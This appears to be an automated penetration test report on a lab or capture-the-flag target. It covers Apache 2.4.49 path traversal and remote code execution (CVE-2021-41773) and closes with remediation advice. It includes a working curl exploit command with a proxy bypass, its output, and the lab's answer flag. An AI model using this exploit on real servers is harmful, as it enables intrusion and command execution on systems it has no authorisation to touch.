# Security Penetration Test Report

**Generated:** 2025-12-16 08:17:22 UTC

High-Impact Vulnerability Scan Report - http://172.17.0.1:10031

1. Vulnerability: Apache 2.4.49 Remote Code Execution (CVE-2021-41773)
- Severity: CRITICAL
- Details: The target is running Apache 2.4.49 (`Server: Apache/2.4.49 (Unix)`), which is vulnerable to Path Traversal and Remote Code Execution. The `mod_cgi` module allows executing commands by traversing out of the aliased directory (`/cgi-bin/`) using the encoded dot pattern `.%2e`.
- Impact: Full system compromise. Attacks allow reading arbitrary files (LFI) and executing arbitrary commands (RCE) as the `daemon` user.
- Proof of Concept (RCE):
  The vulnerability was exploited by bypassing path normalization. The HTTP Proxy was found to interfere with the exploit by normalizing `.%2e` to `..` before transmission, causing the attack to fail (returning 404). Bypassing the proxy using `--noproxy "*"` allowed successful exploitation.

  Exploit Command:
  `curl -v --noproxy "*" --path-as-is -d "echo Content-Type: text/plain; echo; cat /tmp/flag" "http://172.17.0.1:10031/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"`

  Output:
  `FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}`

- Findings:
  - LFI verified: `POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh` used to cat `/tmp/flag`.
  - User Context: `uid=2(daemon) gid=2(daemon)`.
  - Flag Found: `FLAG{17565f0164e2939bd47fc7be82b531721862de31110439e7223e850695866607}`.

2. Recommendations:
- Immediate Upgrade: Update Apache HTTP Server to version 2.4.51 or later.
- Configuration: Ensure `Require all denied` is set for the root directory `/` in `httpd.conf` and explicitly grant access only to necessary directories.
- Disable Modules: Disable `mod_cgi` and `mod_cgid` if not required.
